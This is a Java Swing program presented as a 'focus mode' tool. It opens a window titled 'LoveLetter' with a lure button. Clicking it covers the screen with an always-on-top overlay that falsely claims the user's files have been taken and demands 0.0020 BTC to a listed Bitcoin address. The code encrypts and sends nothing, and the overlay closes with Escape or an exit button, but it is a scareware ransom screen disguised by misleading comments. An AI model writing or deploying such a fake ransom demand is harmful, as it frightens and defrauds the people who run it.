import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class FocusModeApp {
    private JFrame mainFrame;
    private JFrame overlayFrame;
    private JFrame exitFrame;

    public FocusModeApp() {
        createMainFrame();
    }

    private void createMainFrame() {
        mainFrame = new JFrame("LoveLetter");
        mainFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        mainFrame.setSize(320, 120);
        mainFrame.setLayout(new BorderLayout());
        mainFrame.setLocationRelativeTo(null);

        JButton startBtn = new JButton("Loveletter coause im lonely and i want you :<");
        startBtn.addActionListener(e -> enterFocusMode());
        JPanel p = new JPanel();
        p.add(startBtn);

        mainFrame.add(p, BorderLayout.CENTER);
        mainFrame.setVisible(true);
    }

    private void enterFocusMode() {
        if (overlayFrame != null && overlayFrame.isVisible()) return;

        // Fullscreen semi-opaque overlay that sits above other windows
        overlayFrame = new JFrame();
        overlayFrame.setUndecorated(true);
        overlayFrame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        overlayFrame.setBackground(new Color(0, 0, 0, 200));
        overlayFrame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        overlayFrame.setAlwaysOnTop(true);
        overlayFrame.setResizable(false);

        // Add a simple set of labels stacked vertically to remind the user they're in focus mode
        JPanel content = new JPanel();
        content.setOpaque(false);
        content.setLayout(new BoxLayout(content, BoxLayout.Y_AXIS));

        JLabel label = new JLabel("no one expects the spanish inquisition harhar ");
        JLabel label2 = new JLabel("your files are now mine uwu");
        JLabel label3 = new JLabel("wanna see them again ? ");
        JLabel label4 = new JLabel("0.0020 btc to this adress ");
        JLabel label5 = new JLabel("18wmY9BHb4B2aX93TWEQdsCu7UHGJWkvPg");

        // Scale fonts to target 720p so the labels fit on 1280x720 screens
        int screenH = Toolkit.getDefaultToolkit().getScreenSize().height;
        double scale = Math.min(1.0, screenH / 720.0);

        // Base sizes chosen for a 720p target; will scale down on smaller displays
        int base1 = 28; // primary
        int base2 = 18;
        int base3 = 18;
        int base4 = 16;
        int base5 = 14;

        float size1 = Math.max(12, (int)(base1 * scale));
        float size2 = Math.max(12, (int)(base2 * scale));
        float size3 = Math.max(12, (int)(base3 * scale));
        float size4 = Math.max(12, (int)(base4 * scale));
        float size5 = Math.max(12, (int)(base5 * scale));

        label.setForeground(Color.WHITE);
        label.setFont(label.getFont().deriveFont(Font.BOLD, size1));
        label.setAlignmentX(Component.CENTER_ALIGNMENT);

        label2.setForeground(Color.WHITE);
        label2.setFont(label2.getFont().deriveFont(Font.BOLD, size2));
        label2.setAlignmentX(Component.CENTER_ALIGNMENT);

        label3.setForeground(Color.WHITE);
        label3.setFont(label3.getFont().deriveFont(Font.BOLD, size3));
        label3.setAlignmentX(Component.CENTER_ALIGNMENT);

        label4.setForeground(Color.WHITE);
        label4.setFont(label4.getFont().deriveFont(Font.BOLD, size4));
        label4.setAlignmentX(Component.CENTER_ALIGNMENT);

        label5.setForeground(Color.WHITE);
        label5.setFont(label5.getFont().deriveFont(Font.BOLD, size5));
        label5.setAlignmentX(Component.CENTER_ALIGNMENT);

        content.add(Box.createVerticalGlue());
        content.add(label);
        content.add(Box.createVerticalStrut(8));
        content.add(label2);
        content.add(Box.createVerticalStrut(6));
        content.add(label3);
        content.add(Box.createVerticalStrut(6));
        content.add(label4);
        content.add(Box.createVerticalStrut(4));
        content.add(label5);
        content.add(Box.createVerticalGlue());

        overlayFrame.getContentPane().add(content, BorderLayout.CENTER);
        overlayFrame.addMouseListener(new MouseAdapter() {}); // consume clicks on the overlay
        overlayFrame.setVisible(true);

        // Small exit window that stays above the overlay
        exitFrame = new JFrame("I sent huhu");
        exitFrame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        exitFrame.setSize(320, 100);
        exitFrame.setAlwaysOnTop(true);
        exitFrame.setLayout(new BorderLayout(6, 6));
        exitFrame.setResizable(false);

        // Stretching input box that fills the available width/height
        JTextField inputField = new JTextField();
        inputField.setColumns(20);
        inputField.setFont(inputField.getFont().deriveFont(14f));
        inputField.setBorder(BorderFactory.createEmptyBorder(6, 6, 6, 6));
        exitFrame.add(inputField, BorderLayout.CENTER);

        JButton exitBtn = new JButton("Exit Focus Mode");
        exitBtn.addActionListener(e -> exitFocusMode());

        // Allow ESC key to exit focus mode
        exitFrame.getRootPane().registerKeyboardAction(e -> exitFocusMode(),
            KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), JComponent.WHEN_IN_FOCUSED_WINDOW);

        JPanel south = new JPanel(new FlowLayout(FlowLayout.CENTER));
        south.add(exitBtn);
        exitFrame.add(south, BorderLayout.SOUTH);

        exitFrame.setLocationRelativeTo(null);
        exitFrame.setVisible(true);

        // Ensure the exit frame is above the overlay and focus the text field
        exitFrame.toFront();
        inputField.requestFocusInWindow();
    }

    private void exitFocusMode() {
        if (exitFrame != null) {
            exitFrame.dispose();
            exitFrame = null;
        }
        if (overlayFrame != null) {
            overlayFrame.dispose();
            overlayFrame = null;
        }
        if (mainFrame != null) {
            mainFrame.toFront();
            mainFrame.requestFocus();
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(FocusModeApp::new);
    }
}
